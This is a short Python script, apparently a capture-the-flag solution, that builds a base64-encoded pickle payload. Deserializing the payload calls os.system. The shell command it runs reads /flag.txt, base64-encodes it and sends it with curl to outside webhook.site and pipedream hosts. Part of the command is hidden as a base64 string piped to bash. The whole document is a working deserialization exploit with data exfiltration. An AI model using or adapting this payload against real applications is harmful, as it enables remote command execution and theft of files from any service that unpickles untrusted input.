from base64 import b64encode

callback_url = 'https://webhook.site/249ea1e3-d94a-45e3-9a9f-ae3f005a68bb'
payload1 = b64encode(('curl ' + callback_url + '/?q=$(cat${IFS}/flag.txt|base64)').encode())

payload = b"""(cos
system
S'echo """ + payload1 + b"""Y3VybCBodHRwczovL2VvZ2NlOHRndWpmZ2s1Zi5tLnBpcGVkcmVhbS5uZXQvP3E9JChjYXQke0lGU30vZmxhZy50eHR8YmFzZTY0KQ==|base64 -d|bash'
o"""
ab = b64encode(payload)
print(ab)